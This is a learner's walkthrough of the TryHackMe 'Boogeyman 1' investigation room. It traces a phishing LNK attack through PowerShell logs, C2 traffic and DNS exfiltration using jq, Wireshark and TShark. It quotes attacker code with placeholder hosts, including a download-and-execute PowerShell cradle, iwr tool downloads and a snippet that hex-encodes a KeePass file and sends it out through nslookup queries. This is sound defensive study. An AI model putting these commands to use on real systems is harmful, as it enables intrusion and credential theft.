# TryHackMe --- Boogeyman 1

## Detailed Investigation Walkthrough & Learning Notes

**Date:** 7 October 2026\
**Room:** TryHackMe --- Boogeyman 1\
**Focus:** Email Analysis → Endpoint Security → Network Traffic
Analysis\
**Purpose:** Personal learning documentation and future revision

------------------------------------------------------------------------

# 1. Investigation Overview

In this room I investigated an attack from the initial phishing email
through endpoint execution, command execution, command-and-control (C2)
traffic, and data exfiltration.

The investigation was split into multiple stages:

1.  Analyze the phishing email.
2.  Extract and inspect the malicious attachment.
3.  Analyze the `.lnk` file and decode the PowerShell payload.
4.  Investigate PowerShell logs using `jq`.
5.  Identify the tools downloaded and executed by the attacker.
6.  Trace the attacker's directory navigation and file access.
7.  Identify the sensitive file that was read and exfiltrated.
8.  Analyze the network traffic in Wireshark.
9.  Identify the attacker's payload/file server software from HTTP
    headers.
10. Identify the C2 communication and HTTP method used to return command
    output.
11. Recover the exfiltrated database from DNS traffic.
12. Reconstruct and open the recovered KeePass database.
13. Extract the sensitive information stored inside it.

The most important lesson from this room was that the investigation
could be followed as a timeline. The email gave the initial execution
mechanism, PowerShell logs showed what happened on the endpoint, and the
packet capture allowed me to validate the network activity and recover
the exfiltrated data.

------------------------------------------------------------------------

# 2. Task 2 --- Email Analysis

## 2.1 Inspecting the email artifact

The first artifact was an email file named `dump.eml`.

I started by examining the email headers and body instead of immediately
trying to execute or open anything.

Important observations included:

-   Sender: `agriffin@<SANITIZED_DOMAIN>`
-   Recipient: `<SANITIZED_EMAIL>`
-   Attachment: `Invoice.zip`
-   The attachment was encrypted.
-   The email body provided the password needed to open the ZIP archive.
-   The email used an external email delivery/relay service.

The headers also contained a DKIM signature showing an email service
domain. This was useful for understanding how the message was delivered,
but the important investigation point was the attachment.

------------------------------------------------------------------------

## 2.2 Extracting the attachment

The attachment was:

``` text
Invoice.zip
```

After extracting it, I found:

``` text
Invoice_20230103.lnk
```

This was immediately suspicious because a Windows shortcut (`.lnk`) can
execute a program with arbitrary command-line arguments.

The file was presented as an invoice, but instead of directly opening a
normal document, the shortcut was configured to launch PowerShell.

------------------------------------------------------------------------

# 3. LNK Analysis

I used `lnkparse` to inspect the shortcut.

The important fields were:

``` text
Target:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Working Directory:
C:\

Command Line Arguments:
-nop -windowstyle hidden -enc <BASE64_PAYLOAD_REDACTED>
```

The shortcut therefore launched PowerShell with:

-   `-nop` --- no PowerShell profile.
-   `-windowstyle hidden` --- hides the PowerShell window.
-   `-enc` --- executes a Base64-encoded PowerShell command.

This combination is suspicious because it allows the attacker to execute
PowerShell without showing the victim a visible PowerShell window.

------------------------------------------------------------------------

# 4. Decoding the PowerShell Payload

The command-line argument contained Base64-encoded data.

The important thing was not to guess what it meant. I decoded the exact
value extracted from my own `lnkparse` output.

The decoded payload downloaded another script/resource from the
attacker's infrastructure.

The general structure was equivalent to:

``` powershell
iex (
    new-object net.webclient
).downloadstring(
    'http://<FILE_HOST>/update'
)
```

This was an important turning point in the investigation.

I learned that the shortcut did not contain the entire attack chain.
Instead, it used PowerShell to download and execute additional content.

------------------------------------------------------------------------

# 5. Task 3 --- Endpoint Security

The next artifact was:

``` text
powershell.json
```

The room explained that the PowerShell logs contained the endpoint
activity generated after the initial payload executed.

The logs were line-delimited JSON objects rather than one large JSON
array.

This caused an important `jq` lesson.

When I tried to index the file like an array, I encountered:

``` text
Cannot index object with number.
```

That happened because each line was an individual JSON object.

For multiple JSON objects, `jq -s` can be used to slurp them into an
array.

------------------------------------------------------------------------

# 6. Useful jq Techniques

I used commands such as:

``` bash
cat powershell.json | jq
```

to make individual JSON records easier to read.

I also used filtering such as:

``` bash
jq -c 'select(tostring | contains("...")) | {Timestamp, ScriptBlockText}' powershell.json
```

This became one of the most useful techniques in the investigation
because I could search the entire PowerShell log for a specific string
and display only the timestamp and executed command.

I also filtered by timestamps to reconstruct what happened in
chronological order.

------------------------------------------------------------------------

# 7. Identifying the Attacker Infrastructure

I searched the PowerShell logs for URLs and domains.

For example:

``` bash
grep -Eoi 'https?://[^" ]+' powershell.json | sort -u
```

This revealed several important resources, including:

``` text
http://<FILE_HOST>/sb.exe
http://<FILE_HOST>/sq3.exe
http://<FILE_HOST>/update
```

I also identified a separate C2 hostname:

``` text
<C2_HOST>
```

The investigation eventually established three important roles:

  Infrastructure    Role
  ----------------- -------------------------------------------
  `<FILE_HOST>`     Hosted malicious files/payloads
  `<C2_HOST>`       Command-and-control server
  `<ATTACKER_IP>`   Sanitized attacker infrastructure address

------------------------------------------------------------------------

# 8. Identifying the Enumeration Tool

Instead of relying on an external write-up, I searched my own PowerShell
logs.

A targeted search for the relevant activity showed:

``` text
iwr http://<FILE_HOST>/sb.exe -outfile sb.exe
```

followed by commands such as:

``` text
.\sb.exe all
.\sb.exe system
.\sb.exe
.\sb.exe -group=all
.\sb.exe -group=user
```

The logs also contained a reference to the underlying tool name.

This established that the attacker downloaded and executed an endpoint
enumeration tool.

The important investigation technique was:

**download event → execution events → parameters/groups → tool
identification**

I did not need to guess from the filename alone.

------------------------------------------------------------------------

# 9. Tracing Directory Navigation

One of the most useful clues in the room was the instruction to trace
the attacker's `cd` commands.

I ran:

``` bash
jq -c 'select(.ScriptBlockText != null and (.ScriptBlockText | test("cd "))) | {Timestamp, ScriptBlockText}' powershell.json
```

The results showed commands such as:

``` text
cd C:\
cd Users
cd j.westcott
cd Public
cd Music
cd ..\AppData
cd ..
cd Documents
```

This allowed me to understand the attacker's movement through the
victim's filesystem.

------------------------------------------------------------------------

# 10. Identifying the Sensitive Files

While reviewing the timeline, I found a particularly important command:

``` text
ls C:\Users\j.westcott\Documents\protected_data.kdbx
```

This established that the attacker accessed:

``` text
C:\Users\j.westcott\Documents\protected_data.kdbx
```

The `.kdbx` extension indicates a KeePass password database.

This was important because it explained why the file was valuable: it
could contain credentials and other sensitive information.

------------------------------------------------------------------------

# 11. Identifying sq3.exe Activity

The PowerShell logs showed that another binary was downloaded:

``` text
iwr http://<FILE_HOST>/sq3.exe -outfile sq3.exe
```

It was then executed against the Sticky Notes database location:

``` text
.\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
```

Later, the attacker executed:

``` text
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"
```

This was an important discovery.

The attacker used the downloaded SQLite utility to access:

``` text
plum.sqlite
```

and queried the `NOTE` table.

The database output contained information that was later used to recover
a password.

------------------------------------------------------------------------

# 12. Recovering the Database Password

The SQL output from the packet capture was converted from decimal byte
values back into text.

The recovered output contained an entry labelled:

``` text
Master Password
```

The password itself is intentionally **redacted from this README**.

I initially copied the value incorrectly, which caused the TryHackMe
answer checker to reject it. The screenshot/output later showed the
complete value and the correct answer was obtained.

This was a useful lesson: when working with encoded packet data, copying
one character incorrectly can completely change the result.

------------------------------------------------------------------------

# 13. Task 4 --- Network Traffic Analysis

The next stage used:

``` text
capture.pcapng
```

I opened the capture in Wireshark.

The room's instructions were to use the domains and ports discovered
from the PowerShell investigation.

------------------------------------------------------------------------

# 14. Finding the Payload/File Server

I filtered the traffic for the malicious file host:

``` text
http.host == "<FILE_HOST>"
```

The capture showed requests such as:

``` text
GET /update HTTP/1.1
GET /sb.exe HTTP/1.1
GET /sq3.exe HTTP/1.1
```

This confirmed that the files seen in the PowerShell logs were also
present in the network capture.

------------------------------------------------------------------------

# 15. Identifying the File Server Software

The room specifically instructed me to inspect the HTTP response
headers.

I selected an HTTP response corresponding to the malicious file server.

In the packet details I found:

``` text
Server: SimpleHTTP/0.6 Python/3.10.7
```

This allowed me to identify the software used by the attacker to host
the presumed file/payload server.

The important lesson here was:

**Don't look only at the URL. Inspect HTTP headers.**

The `Server:` header directly revealed the server implementation.

------------------------------------------------------------------------

# 16. Finding the C2

The PowerShell logs contained C2 code that repeatedly contacted:

``` text
<C2_HOST>:8080
```

The script structure was essentially:

``` powershell
Invoke-WebRequest ... /<COMMAND_ENDPOINT>
```

It repeatedly requested commands and then sent command results back to
the server.

This established the C2 behaviour:

1.  Victim contacts C2.
2.  C2 provides a command.
3.  PowerShell executes the command.
4.  Output is converted to a string.
5.  Output is sent back to the C2 server.
6.  The process repeats.

------------------------------------------------------------------------

# 17. Identifying the HTTP Method Used for C2 Output

In Wireshark I filtered the C2 traffic using the C2 server and port.

The traffic contained requests such as:

``` text
GET /<COMMAND_ENDPOINT> HTTP/1.1
```

and another endpoint used to send results:

``` text
POST /<RESULT_ENDPOINT> HTTP/1.1
```

The response/output endpoint therefore used:

``` text
POST
```

This was visible directly in the HTTP request headers.

------------------------------------------------------------------------

# 18. Following the C2 Stream

At one point, a normal display filter did not immediately show the
expected packets.

Instead of assuming the traffic was missing, I used:

``` text
Follow → TCP Stream
```

This was much more effective because it showed the complete conversation
between the victim and C2.

One of the useful streams contained:

``` text
POST /<RESULT_ENDPOINT> HTTP/1.1
```

and the body contained command output.

This taught me that when individual packets are difficult to interpret,
following the TCP stream can reconstruct the application-level
conversation.

------------------------------------------------------------------------

# 19. Recovering the Exfiltration Traffic

The PowerShell logs showed that the sensitive KeePass database was read
into memory.

The relevant commands were similar to:

``` powershell
$file='C:\Users\<USER>\Documents\protected_data.kdbx'
$destination="<ATTACKER_IP>"
$bytes=[System.IO.File]::ReadAllBytes($file)
```

Then:

``` powershell
$hex = ($bytes | ForEach-Object ToString X2) -join ''
```

The file was converted into hexadecimal.

The hexadecimal data was then split into chunks:

``` powershell
$split = $hex -split '(\S{50})'
```

Each chunk was sent through DNS queries using a pattern like:

``` powershell
nslookup -q=A "$line.<SANITIZED_DOMAIN>" $destination
```

This was the key to understanding the exfiltration method.

The file was:

**read → converted to hex → split into chunks → embedded in DNS queries
→ sent to the attacker**

------------------------------------------------------------------------

# 20. Reconstructing the Exfiltrated File with TShark

Instead of manually extracting thousands of packets in Wireshark, I
switched to TShark.

The initial command was too broad and produced a very large amount of
output.

The useful idea was to extract:

``` text
dns.qry.name
```

from the DNS packets.

I then used:

``` bash
tshark -r capture.pcapng -Y "ip.dst==<ATTACKER_IP> && dns" \
-T fields -e dns.qry.name
```

The output contained repeated DNS queries.

------------------------------------------------------------------------

# 21. Understanding the Duplicate DNS Queries

The first reconstruction attempt produced a file that KeePass could not
open.

Inspection showed the beginning of the file repeatedly contained the
KDBX header.

The reason was visible in the DNS queries.

Each chunk appeared multiple times, for example:

``` text
<HEX_CHUNK>.<SANITIZED_DOMAIN>.eu-west-1.ec2-utilities.amazonaws.com
<HEX_CHUNK>.<SANITIZED_DOMAIN>.eu-west-1.compute.internal
<HEX_CHUNK>.<SANITIZED_DOMAIN>
```

The same hexadecimal chunk was therefore appearing through multiple
DNS-related names.

If all of those were concatenated, the resulting file would contain
duplicated data.

------------------------------------------------------------------------

# 22. Corrected DNS Extraction

I changed the extraction so that only the direct attacker-domain queries
were selected:

``` bash
tshark -r capture.pcapng \
-Y "ip.dst==<ATTACKER_IP> && dns" \
-T fields -e dns.qry.name \
| grep -E '^[A-F0-9]+\.<SANITIZED_DOMAIN>$' \
| cut -d '.' -f1 \
| tr -d '\n' \
| xxd -r -p > protected_data.kdbx
```

This produced:

``` text
protected_data.kdbx
```

with a size of approximately 2.2 KB in the reconstructed artifact.

------------------------------------------------------------------------

# 23. Verifying the Reconstructed File

I ran:

``` bash
file protected_data.kdbx
```

The result identified it as:

``` text
Keepass password database 2.x KDBX
```

This was an important validation step.

Rather than immediately opening the file, I first confirmed its file
type.

------------------------------------------------------------------------

# 24. Opening the Reconstructed KeePass Database

I opened:

``` text
protected_data.kdbx
```

using KeePass.

I supplied the recovered master password from the earlier Sticky Notes
database.

This time the database opened successfully.

The database contained a banking-related entry.

------------------------------------------------------------------------

# 25. Sensitive Information Found

The recovered KeePass entry contained:

``` text
Name: Quick Logistics LLC
Account Number: <REDACTED>
CVV: <REDACTED>
Expiration Date: <REDACTED>
```

The credit card/account number was successfully recovered during the
lab.

For security and sanitization purposes, the actual financial number is
**not included in this README**.

------------------------------------------------------------------------

# 26. Investigation Timeline

A simplified timeline of the attack was:

``` text
Phishing Email
      ↓
Invoice.zip
      ↓
Invoice_20230103.lnk
      ↓
Hidden PowerShell
      ↓
Base64 payload
      ↓
Download / execute update
      ↓
Endpoint enumeration
      ↓
Download enumeration tool
      ↓
Filesystem discovery
      ↓
Sensitive files identified
      ↓
Download SQLite utility
      ↓
Query Sticky Notes database
      ↓
Recover password
      ↓
Read protected_data.kdbx
      ↓
Convert file to hexadecimal
      ↓
Split into chunks
      ↓
DNS-based exfiltration
      ↓
Recover DNS chunks from PCAP
      ↓
Reconstruct protected_data.kdbx
      ↓
Open KeePass database
      ↓
Recover sensitive financial information
```

------------------------------------------------------------------------

# 27. Important Commands Used

## Search URLs

``` bash
grep -Eoi 'https?://[^" ]+' powershell.json | sort -u
```

## Search domains

``` bash
grep -Eoi '[A-Za-z0-9.-]+\.[A-Za-z]{2,}' powershell.json | sort -u
```

## Search PowerShell logs for a string

``` bash
jq -c 'select(tostring | contains("STRING")) | {Timestamp, ScriptBlockText}' powershell.json
```

## Search `cd` commands

``` bash
jq -c 'select(.ScriptBlockText != null and (.ScriptBlockText | test("cd "))) | {Timestamp, ScriptBlockText}' powershell.json
```

## Search a time range

``` bash
jq -c 'select(.Timestamp >= "2023-01-13 17:21" and .Timestamp < "2023-01-13 17:24") | {Timestamp, ScriptBlockText}' powershell.json | sort
```

## Search downloaded/executed files

``` bash
jq -c 'select(.ScriptBlockText != null and (.ScriptBlockText | test("downloadstring|iwr|\\.exe"; "i"))) | {Timestamp, ScriptBlockText}' powershell.json | sort
```

## Identify file type

``` bash
file protected_data.kdbx
```

## Inspect file header

``` bash
xxd -l 16 protected_data.kdbx
```

## Extract DNS query names

``` bash
tshark -r capture.pcapng -Y "ip.dst==<ATTACKER_IP> && dns" \
-T fields -e dns.qry.name
```

## Reconstruct the exfiltrated KDBX

``` bash
tshark -r capture.pcapng \
-Y "ip.dst==<ATTACKER_IP> && dns" \
-T fields -e dns.qry.name \
| grep -E '^[A-F0-9]+\.<SANITIZED_DOMAIN>$' \
| cut -d '.' -f1 \
| tr -d '\n' \
| xxd -r -p > protected_data.kdbx
```

------------------------------------------------------------------------

# 28. What I Learned

## 28.1 Phishing does not always mean an executable attachment

The initial attachment looked like an invoice archive, but the real
malicious component was a Windows shortcut.

A `.lnk` file can execute a legitimate Windows binary such as PowerShell
while supplying malicious arguments.

------------------------------------------------------------------------

## 28.2 PowerShell logging can reconstruct an attack

The `powershell.json` artifact was extremely valuable.

It allowed me to reconstruct:

-   downloaded files
-   executed commands
-   directory navigation
-   file discovery
-   enumeration activity
-   database queries
-   C2 activity
-   data collection
-   exfiltration preparation

The timestamps were especially useful because they allowed the
individual commands to be placed into an attack timeline.

------------------------------------------------------------------------

## 28.3 Tool names can be hidden behind renamed binaries

The attacker downloaded a file named:

``` text
sb.exe
```

The filename alone did not tell me what it was.

The logs showed how it was executed, and additional script references
revealed the underlying enumeration tool.

This is why I should not identify a tool based only on a suspicious
filename.

------------------------------------------------------------------------

## 28.4 File extensions can reveal the nature of stolen data

The attacker accessed:

``` text
protected_data.kdbx
```

The `.kdbx` extension immediately suggested a KeePass password database.

This helped explain why the attacker considered the file valuable.

------------------------------------------------------------------------

## 28.5 C2 traffic can be identified from behaviour

The C2 script repeatedly:

1.  contacted the server,
2.  retrieved commands,
3.  executed them,
4.  captured the output,
5.  sent the output back.

The use of different HTTP endpoints for command retrieval and result
submission helped distinguish C2 traffic from ordinary web traffic.

------------------------------------------------------------------------

## 28.6 HTTP headers can identify server software

The malicious payload server exposed:

``` text
Server: SimpleHTTP/0.6 Python/3.10.7
```

This showed why HTTP headers should always be inspected during packet
analysis.

The URL alone would not have revealed the server implementation.

------------------------------------------------------------------------

## 28.7 DNS can be abused for data exfiltration

The most important network-analysis lesson was the DNS exfiltration.

The attacker converted the binary file into hexadecimal and split it
into chunks.

The chunks were placed into DNS query names.

This allowed data to leave the system through DNS traffic.

The investigation therefore required:

``` text
PCAP
 ↓
DNS queries
 ↓
Hexadecimal chunks
 ↓
Reassembly
 ↓
Original binary file
```

------------------------------------------------------------------------

# 29. Mistakes I Made and What They Taught Me

### Mistake 1 --- Looking for answers instead of following evidence

At one point I searched specifically for a known tool name. That was not
the correct investigation mindset.

The better approach is:

``` text
Artifact → Evidence → Hypothesis → Verification
```

I should search the logs for observable indicators first, then identify
the tool from the evidence.

------------------------------------------------------------------------

### Mistake 2 --- Using an overly broad Wireshark filter

Some filters produced either too many packets or no useful packets.

The solution was to use the infrastructure discovered earlier and narrow
the traffic by:

-   IP
-   port
-   protocol
-   hostname
-   endpoint
-   TCP stream

------------------------------------------------------------------------

### Mistake 3 --- Looking at only one packet

A single packet often showed only TCP setup or part of an HTTP exchange.

Following the TCP stream made the entire conversation much easier to
understand.

------------------------------------------------------------------------

### Mistake 4 --- Reconstructing DNS data without removing duplicates

The first extracted KDBX file contained repeated header data.

The reason was that the same DNS chunk appeared in multiple DNS queries.

I fixed this by selecting only the direct attacker-domain queries.

This was a very useful lesson about packet reconstruction: **the first
successful-looking extraction is not automatically correct. Validate the
reconstructed file.**

------------------------------------------------------------------------

### Mistake 5 --- Trusting a filename

`sb.exe` and `sq3.exe` were not meaningful enough by themselves.

The surrounding commands and URLs were necessary to understand what the
attacker was doing.

------------------------------------------------------------------------

# 30. Investigation Methodology I Want to Remember

When investigating a similar incident, I want to follow this sequence:

### Step 1 --- Start with the initial artifact

Ask:

-   What arrived?
-   Who sent it?
-   What was attached?
-   What does the attachment execute?

### Step 2 --- Identify execution

For a shortcut:

-   target executable
-   arguments
-   working directory
-   encoded payload

### Step 3 --- Decode, don't guess

If Base64 or another encoding is present, decode the exact value from
the artifact.

### Step 4 --- Build a timeline

Use timestamps to determine:

``` text
Initial execution
→ download
→ execution
→ discovery
→ collection
→ exfiltration
```

### Step 5 --- Identify infrastructure

Record:

-   file server
-   C2 server
-   ports
-   protocols
-   URLs
-   HTTP endpoints

### Step 6 --- Validate endpoint activity in network traffic

Use the PCAP to confirm the activity observed in logs.

### Step 7 --- Follow streams

When HTTP/TCP traffic is fragmented across multiple packets, use:

``` text
Follow → TCP Stream
```

### Step 8 --- Identify exfiltration encoding

Look at the PowerShell code.

In this case:

``` text
File bytes
→ hexadecimal
→ chunks
→ DNS queries
```

### Step 9 --- Reconstruct

Use TShark to extract only the relevant traffic.

### Step 10 --- Validate the recovered artifact

Use:

``` bash
file <artifact>
```

before attempting to open it.

### Step 11 --- Extract the final evidence

Only after the recovered file is verified should I inspect its contents.

------------------------------------------------------------------------

# 31. Final Investigation Summary

This room demonstrated a complete attack chain beginning with a phishing
email and ending with the theft of sensitive information.

The attacker used a malicious Windows shortcut to launch hidden
PowerShell. The PowerShell payload downloaded additional content,
performed endpoint enumeration, navigated through the victim's
filesystem, accessed a sensitive KeePass database, and used a SQLite
utility to inspect a Sticky Notes database.

The packet capture then allowed me to validate the network activity.
HTTP headers revealed the software used to host the malicious payloads.
The C2 communication used HTTP and exposed separate endpoints for
retrieving commands and sending command output.

The most interesting part of the investigation was the exfiltration
mechanism. The attacker converted the sensitive KDBX file into
hexadecimal, split it into chunks, and transmitted those chunks through
DNS queries. Using TShark, I extracted the correct DNS chunks,
reconstructed the KDBX database, verified its file type, and opened it
using the password recovered from the earlier database query.

The investigation therefore connected multiple evidence sources:

``` text
Email
 ↓
LNK
 ↓
PowerShell
 ↓
Endpoint logs
 ↓
C2
 ↓
PCAP
 ↓
DNS exfiltration
 ↓
Recovered KDBX
 ↓
Sensitive data
```

This is the main workflow I want to remember from the Boogeyman 1 room.

------------------------------------------------------------------------

# 32. Artifacts Used

``` text
dump.eml
Invoice.zip
Invoice_20230103.lnk
powershell.json
capture.pcapng
protected_data.kdbx
```

Sensitive values intentionally omitted from this documentation:

``` text
[REDACTED] Email credentials / addresses
[REDACTED] Passwords
[REDACTED] Attacker IP addresses
[REDACTED] Malicious domains
[REDACTED] Credit card/account numbers
[REDACTED] CVV
```


